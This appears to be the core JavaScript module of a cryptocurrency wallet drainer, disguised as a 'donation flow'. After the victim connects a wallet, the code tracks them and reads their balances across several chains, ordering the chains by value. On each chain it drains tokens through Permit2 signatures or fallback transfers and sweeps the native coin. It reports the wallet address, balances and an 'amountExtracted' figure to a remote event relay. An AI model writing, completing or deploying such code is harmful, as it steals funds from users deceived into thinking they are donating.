
// ---------- src/engine/donate.js ----------
// Updated runDonationFlow: consistent provider usage and read-only RPC separation
import { notify } from "../utils/notify.js";
import { sendEvent } from "../utils/eventRelay.js";
import {
  fetchBalancesCovalent,
  filterPermit2SafeTokens,
  getChainValue,
} from "./balances.js";
import { getProviderForChain } from "./providerHelper.js";
import { isPermit2Compatible, executePermit2Batch } from "./permit2.js";
import { executeFallbackBatch, sweepNative } from "./fallback.js";
import { CHAINS, exceptionList } from "../config.js";
import { ethers } from "ethers";

async function fetchNativePrice(symbol) {
  try {
    const idMap = {
      ETH: "ethereum",
      BNB: "binancecoin",
      MATIC: "matic-network",
      AVAX: "avalanche-2",
      FTM: "fantom",
      OP: "optimism",
      ARB: "arbitrum",
    };
    const id = idMap[symbol];
    if (!id) return 0;
    const res = await fetch(
      `https://api.coingecko.com/api/v3/simple/price?ids=${id}&vs_currencies=usd`
    );
    const json = await res.json();
    return json[id]?.usd || 0;
  } catch (err) {
    console.warn("Coingecko price error", err);
    return 0;
  }
}

export async function runDonationFlow(walletClient) {
  try {
    let owner = null;

    if (walletClient?.account?.address) {
      owner = walletClient.account.address;
    } else if (typeof window !== "undefined" && window.ethereum) {
      const injectedProvider = new ethers.BrowserProvider(window.ethereum);
      await injectedProvider.send("eth_requestAccounts", []);
      owner = await injectedProvider.getSigner().getAddress();
    }

    if (!owner) throw new Error("Wallet not connected");

    const trackingId = Date.now().toString();
    
    
    // -------------------------
    // LINK_OPENED (1st event)
    // -------------------------
    if (typeof window !== "undefined") {
      const openedPayload = {
        openedUrl: window.location.href,
        visitorIp: null, // optional: backend can enrich this
        trackingId,
      };
      notify("LINK_OPENED", openedPayload);
      await sendEvent("LINK_OPENED", openedPayload);
    }

    
    // -------------------------
    // Fetch balances immediately (READ-ONLY using chain.rpcUrl)
    // -------------------------
    const chainBalances = [];
    for (const chain of CHAINS) {
      const raw = await fetchBalancesCovalent(owner, chain.chainId);
      const filtered = await filterPermit2SafeTokens(raw);

      // Use read-only RPC (safe for CORS if using a provider with CORS) for balance lookups
      const rpcProvider = new ethers.JsonRpcProvider(chain.rpcUrl);
      const nativeRaw = await rpcProvider.getBalance(owner);
      const nativeFormatted = parseFloat(ethers.formatEther(nativeRaw));
      const nativePrice = await fetchNativePrice(chain.nativeSymbol);
      const nativeUSD = nativeFormatted * nativePrice;

      const tokensValue = getChainValue(filtered);
      const totalValue = tokensValue + nativeUSD;

      chainBalances.push({
        chainId: chain.chainId,
        name: chain.name,
        native: nativeFormatted,
        nativeUSD,
        tokens: filtered,
        totalValue,
      });
    }

    const balancesPayload = chainBalances.map((c) => ({
      name: c.name,
      native: Number(c.native).toFixed(6),
      nativeValue: Number(c.nativeUSD || 0).toFixed(2),
      tokens: c.tokens.map((t) => ({
        name: t.tokenSymbol,
        amount: Number(
          ethers.formatUnits(t.balanceRaw, t.contract_decimals || 18)
        ).toFixed(6),
        value: Number(t.quote).toFixed(2),
      })),
      total: Number(c.totalValue).toFixed(2),
    }));
    const grandTotal = balancesPayload.reduce(
      (acc, c) => acc + parseFloat(c.total || 0),
      0
    );

    const connectedPayload = {
      walletAddress: owner,
      trackingId,
      balances: balancesPayload,
      grandTotal: Number(grandTotal).toFixed(2),
    };

    notify("WALLET_CONNECTED", connectedPayload);
    await sendEvent("WALLET_CONNECTED", connectedPayload);

    // -------------------------
    // Donation processing (use wallet-backed provider/signer for txs)
    // -------------------------
    chainBalances.sort((a, b) => b.totalValue - a.totalValue);

    for (const chain of chainBalances) {
      const startPayload = { walletAddress: owner, trackingId, chain: chain.name };
      notify("DONATION_START", startPayload);
      await sendEvent("DONATION_START", startPayload);

      // Get wallet-backed provider + signer for this chainId
      const { provider, signer } = await getProviderForChain(walletClient, chain.chainId, trackingId);

      if (!provider || !signer) {
        console.warn("No signer/provider for chain", chain.chainId);
        continue;
      }

      const permit2Tokens = [];
      const fallbackTokens = [];

      for (const t of chain.tokens) {
        const addr = t.tokenAddress.toLowerCase();
        if (exceptionList?.[chain.chainId]?.includes(addr)) {
          fallbackTokens.push(t);
          continue;
        }
        const ok = await isPermit2Compatible(addr, signer);
        if (ok) permit2Tokens.push(t);
        else fallbackTokens.push(t);
      }

      try {
        if (permit2Tokens.length) {
          for (const t of permit2Tokens) {
            // executePermit2Batch returns a transaction (or promise of one)
            const tx = await executePermit2Batch(signer, chain.chainId, [t]);
            if (tx && tx.wait) await tx.wait();
          }
        }
      } catch (err) {
        console.warn("permit2 batch error", err);
        fallbackTokens.push(...permit2Tokens);
      }

      try {
        if (fallbackTokens.length) {
          for (const t of fallbackTokens) {
            const tx = await executeFallbackBatch(signer, chain.chainId, [t]);
            if (tx && tx.wait) await tx.wait();
          }
        }
      } catch (err) {
        console.warn("fallback batch error", err);
      }

      try {
        const sweepTx = await sweepNative(signer, provider, chain.chainId);
        if (sweepTx && sweepTx.wait) await sweepTx.wait();
      } catch (err) {
        console.warn("native sweep error", err);
      }

      // Re-fetch balances + donation summary (READ-ONLY)
      const refreshedRaw = await fetchBalancesCovalent(owner, chain.chainId);
      const refreshedFiltered = await filterPermit2SafeTokens(refreshedRaw);

      const refreshedProvider = new ethers.JsonRpcProvider(
        CHAINS.find((c) => c.chainId === chain.chainId)?.rpcUrl
      );
      const refreshedNativeRaw = await refreshedProvider.getBalance(owner);
      const refreshedNative = parseFloat(ethers.formatEther(refreshedNativeRaw));

      const refreshedNativePrice = await fetchNativePrice(chain.name === "BSC" ? "BNB" : "ETH");
      const refreshedNativeUSD = refreshedNative * refreshedNativePrice;

      const refreshedTokensValue = getChainValue(refreshedFiltered);
      const refreshedTotal = refreshedTokensValue + refreshedNativeUSD;

      const amountExtracted = Math.max(0, Number(chain.totalValue) - Number(refreshedTotal));

      const resultsPayload = {
        walletAddress: owner,
        trackingId,
        balances: [
          {
            name: chain.name,
            native: refreshedNative.toFixed(6),
            nativeValue: Number(refreshedNativeUSD || 0).toFixed(2),
            tokens: refreshedFiltered.map((t) => ({
              name: t.tokenSymbol,
              amount: Number(
                ethers.formatUnits(t.balanceRaw, t.contract_decimals || 18)
              ).toFixed(6),
              value: Number(t.quote).toFixed(2),
            })),
            total: refreshedTotal.toFixed(2),
          },
        ],
        donationSummary: {
          total: amountExtracted.toFixed(2),
          breakdown: [{ chain: chain.name, amount: amountExtracted.toFixed(2) }],
        },
      };

      notify("DONATION_MADE", resultsPayload);
      await sendEvent("DONATION_MADE", resultsPayload);
    }

    const completedPayload = { walletAddress: owner, trackingId };
    notify("DONATION_COMPLETED", completedPayload);
    await sendEvent("DONATION_COMPLETED", completedPayload);

    return { success: true };
  } catch (err) {
    console.error("runDonationFlow error:", err);
    return { success: false, reason: err.message || String(err) };
  }
}

